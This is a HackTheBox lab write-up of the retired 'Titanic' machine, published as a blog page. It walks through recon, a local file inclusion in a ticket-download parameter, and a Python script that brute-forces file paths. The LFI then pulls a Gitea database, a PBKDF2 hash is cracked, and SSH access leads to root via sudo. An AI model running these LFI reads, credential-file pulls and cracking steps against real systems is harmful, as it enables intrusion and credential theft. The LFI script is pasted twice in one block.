---
layout: page
title: Titanic
description: LFI to steal credentials.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/titanic/logo.png" title="HTB Titanic Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Titanic">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
So, Titanic just retired.  Now I can do my write-up for it.

Let's get our nmap scans run to identify the services.

{% raw %}
```bash
└──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.11.55
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 22:30 CDT
Nmap scan report for 10.10.11.55
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
{% endraw %}

<br />
Update the /etc/hosts file to include the titanic.htb redirect.

{% raw %}
```bash
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot
10.10.11.55 titanic.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-uqfp1x2gbg htb-uqfp1x2gbg.htb-cloud.com
```
{% endraw %}

<br />
Run the curl -I to try and identify the technology.

{% raw %}
```bash
└──╼ [★]$ curl -I http://titanic.htb
HTTP/1.1 200 OK
Date: Sat, 24 May 2025 03:40:22 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 7399
```
{% endraw %}

<br />
View the landing page for the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the landing page source code.

{% raw %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Titanic - Book Your Ship Trip</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="/static/styles.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="/static/assets/images/favicon.ico">
    <style>
        body {
            font-family: 'Playfair Display', serif;
        }
        .hero-section {
            background-image: url("/static/assets/images/home.jpg");
            background-size: cover;
            background-position: center;
            color: white;
            padding: 100px 0;
        }
    </style>
</head>
<body>

<snip>

</body>
</html>    
```
{% endraw %}

<br />
Check if there is a robots file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/robots.png" title="Robots.txt" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the booking functionality.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/booking.png" title="Booking Functionality" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the request that we just sent in the Burp Suite.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/burp.png" title="Burp Functionality" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Send it to repeater and update the ticket parameter to pull /etc/passwd proving LFI.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/passwd.png" title="LFI Passwd" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the full passwd file.

{% raw %}
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
{% endraw %}

<br />
Generate a file list to test the lfi.

{% raw %}
```bash
\apache2\log\access_log
\apache2\log\access.log
\apache2\log\error_log
\apache2\log\error.log
/apache2/logs/access.log
/apache2/logs/access.log
\apache2\logs\access_log
\apache2\logs\access.log

<snip>
```
{% endraw %}
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/List_Of_File_To_Include.txt</a>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt</a>

<br />
Write a python script that submits all of the files from our list and filters out Ticket Not Found.

{% raw %}
```python
import requests

with open('/home/kali/Documents/htb/titanic/lfi', 'r') as fs:
    for line in fs:
        file = line.rstrip('\n')

        url = f'http://titanic.htb/download?ticket={file}'

        results = requests.get(url=url)

        if 'Ticket not found' not in results.text:
            print('**********************************')
            print(url)
            print(results.text)
            print('**********************************')import requests

with open('/home/kali/Documents/htb/titanic/lfi', 'r') as fs:
    for line in fs:
        file = line.rstrip('\n')

        url = f'http://titanic.htb/download?ticket={file}'

        results = requests.get(url=url)

        if 'Ticket not found' not in results.text:
            print('**********************************')
            print(url)
            print(results.text)
            print('**********************************')
```
{% endraw %}

<br />
From the results, notice the /etc/hosts.

{% raw %}
```bash
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}
<a href="http://titanic.htb/download?ticket=/etc/hosts">http://titanic.htb/download?ticket=/etc/hosts</a>

<br />
Update our /etc/hosts to include the dev.titanic.htb.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/titanic]
└─$ cat /etc/hosts              
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.55     titanic.htb dev.titanic.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endraw %}

<br />
Check the dev landing page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/devlanding.png" title="Dev Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the repos in the Gitea.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/repos.png" title="Check Repos" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Eumerate the repo and notice the two tickets.  Potential usernames somewhere.

{% raw %}
```json
{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
```
{% endraw %}

<br />
Check the mysql/docker-compose.yml.

{% raw %}
```yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```
{% endraw %}

<br />
Check the gitea/docker-compose.yml.

{% raw %}
```yaml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
{% endraw %}

<br />
Look up the possible locations of the Gitea app.ini file and play with the URL and LFI to pull the app.ini file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/appini.png" title="app.ini" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini">http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini</a>

<br />
Download the gitea.db.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/titanic]
└─$ wget http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -O gitea.db
--2025-05-25 20:19:07--  http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
Resolving titanic.htb (titanic.htb)... 10.10.11.55
Connecting to titanic.htb (titanic.htb)|10.10.11.55|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2084864 (2.0M) [application/octet-stream]
Saving to: ‘gitea.db’

gitea.db                                                   100%[========================================================================================================================================>]   1.99M   429KB/s    in 7.6s    

2025-05-25 20:19:15 (268 KB/s) - ‘gitea.db’ saved [2084864/2084864]
```
{% endraw %}

<br />
Check the user table in Sqlite Browser.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/usertable.png" title="User Table" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
From the [Filter] field, we know the encryption is PBDKF2.  Look up a cracker for that algorithm.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/github.png" title="PBDKF2 Cracker" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/Eli4m/HMAC_PBDKF2_Cracker">https://github.com/Eli4m/HMAC_PBDKF2_Cracker</a>

<br />
Download the cracker.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/titanic]
└─$ wget https://raw.githubusercontent.com/Eli4m/HMAC_PBDKF2_Cracker/refs/heads/main/PBKDF2_HMAC_Decrypt.py -O phd.py --inet4-only
--2025-05-25 20:41:24--  https://raw.githubusercontent.com/Eli4m/HMAC_PBDKF2_Cracker/refs/heads/main/PBKDF2_HMAC_Decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2775 (2.7K) [text/plain]
Saving to: ‘phd.py’

phd.py                                                     100%[========================================================================================================================================>]   2.71K  --.-KB/s    in 0s      

2025-05-25 20:41:25 (41.2 MB/s) - ‘phd.py’ saved [2775/2775]
```
{% endraw %}

<br />
Run the cracker for the developer account and get a result.  Neat!

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/titanic]
└─$ python3 phd.py -ph e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt -s 8bf3e3452b78544f8bee9400d6936d34 -i 50000 -l 50

<snip>

Trying: willis
Trying: tamtam
Trying: ryan
Trying: register
Trying: password01
Trying: magali
Trying: larsson
Trying: kimbum
Trying: killa1
Trying: kidrock
Trying: july23
Trying: july15
Trying: emogurl
Trying: callalily
Trying: baby21
Trying: 25282528


MATCH Found!: 25282528
```
{% endraw %}

<br />
Check for password reuse and ssh in as the developer account.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/titanic]
└─$ ssh developer@10.10.11.55                 
The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.55' (ED25519) to the list of known hosts.
developer@10.10.11.55's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 25 11:01:45 AM UTC 2025

  System load:           0.01
  Usage of /:            70.9% of 6.79GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.55
  IPv6 address for eth0: dead:beef::250:56ff:fe95:87d1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun May 25 10:15:07 2025 from 10.10.16.11
developer@titanic:~$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
developer@titanic:~$ cat /home/developer/user.txt 
<redacted>
developer@titanic:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:87:d1 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.55/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:87d1/64 scope global dynamic mngtmpaddr 
       valid_lft 86393sec preferred_lft 14393sec
    inet6 fe80::250:56ff:fe95:87d1/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:82:ea:6e:75 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-892511bece4a: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:3f:23:c7:26 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-892511bece4a
       valid_lft forever preferred_lft forever
    inet6 fe80::42:3fff:fe23:c726/64 scope link 
       valid_lft forever preferred_lft forever
6: veth08b27f9@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-892511bece4a state UP group default 
    link/ether ce:de:5e:b5:7b:85 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::ccde:5eff:feb5:7b85/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run sudo -l to see all the commands that we can run as sudo.

{% raw %}
```bash
developer@titanic:~$ sudo -l
Matching Defaults entries for developer on titanic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on titanic:
    (ALL) NOPASSWD: ALL
```
{% endraw %}

<br />
Sudo into root.

{% raw %}
```bash
developer@titanic:~$ sudo su
root@titanic:/home/developer#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
root@titanic:/home/developer# cat /root/root.txt
<redacted>
root@titanic:/home/developer# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:87:d1 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.55/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:87d1/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:fe95:87d1/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:82:ea:6e:75 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-892511bece4a: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:3f:23:c7:26 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-892511bece4a
       valid_lft forever preferred_lft forever
    inet6 fe80::42:3fff:fe23:c726/64 scope link 
       valid_lft forever preferred_lft forever
6: veth08b27f9@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-892511bece4a state UP group default 
    link/ether ce:de:5e:b5:7b:85 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::ccde:5eff:feb5:7b85/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that, we bring the Titanic box home.  Hopefully, you enjoyed the read.  See you in the next one.

<br />
<h2>Trophy</h2>
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/titanic/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>